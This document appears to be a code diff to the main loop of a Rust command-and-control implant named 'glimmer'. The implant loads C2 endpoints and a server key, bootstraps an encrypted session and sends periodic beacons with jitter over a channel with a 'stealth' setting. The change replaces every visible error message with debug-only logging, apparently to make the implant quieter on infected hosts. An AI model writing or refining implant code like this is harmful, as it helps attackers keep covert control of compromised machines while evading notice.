@@ -8,8 +8,8 @@ use glimmer::proto::{CheckinData, Envelope, MsgType};
 fn main() {
     let config = match Config::load("config.json") {
         Ok(c) => c,
-        Err(e) => {
-            eprintln!("config: {}", e);
+        Err(_e) => {
+            glimmer::dbg_log!("[dev] config: {}", _e);
             std::process::exit(1);
         }
     };
@@ -18,22 +18,22 @@ fn main() {
 
     let server_pub = match config.server_public_key_bytes() {
         Ok(k) => k,
-        Err(e) => {
-            eprintln!("invalid server public key: {}", e);
+        Err(_e) => {
+            glimmer::dbg_log!("[dev] invalid server public key: {}", _e);
             std::process::exit(1);
         }
     };
 
-    let channel = match HTTPChannel::new(config.c2_endpoints.clone()) {
+    let channel = match HTTPChannel::new(config.endpoints().to_vec()) {
         Ok(c) => c,
-        Err(e) => {
-            eprintln!("channel init failed: {}", e);
+        Err(_e) => {
+            glimmer::dbg_log!("[dev] channel init failed: {}", _e);
             std::process::exit(1);
         }
     };
 
     glimmer::dbg_log!(
-        "channel: {} (stealth={}, max={})",
+        "[dev] channel: {} (stealth={}, max={})",
         channel.info().name,
         channel.info().stealth,
         channel.info().max_payload
@@ -50,11 +50,11 @@ fn main() {
 
     let time_key = match bootstrap(&node_id, &checkin, &server_pub, &channel) {
         Ok(tk) => {
-            eprintln!("[dev] bootstrap complete, time-based key established");
+            glimmer::dbg_log!("[dev] bootstrap complete, time-based key established");
             tk
         }
-        Err(e) => {
-            eprintln!("[dev] bootstrap failed: {}", e);
+        Err(_e) => {
+            glimmer::dbg_log!("[dev] bootstrap failed: {}", _e);
             std::process::exit(1);
         }
     };
@@ -69,11 +69,11 @@ fn main() {
             &server_pub,
             &channel,
         ) {
-            Ok(_) => eprintln!("[dev] beacon sent [layered]"),
-            Err(e) => eprintln!("[dev] beacon failed: {}", e),
+            Ok(_) => { glimmer::dbg_log!("[dev] beacon sent [layered]"); },
+            Err(_e) => { glimmer::dbg_log!("[dev] beacon failed: {}", _e); },
         }
 
-        sleep(config.beacon_interval(), config.jitter_percent);
+        sleep(config.beacon_interval(), config.jitter());
     }
 }
 
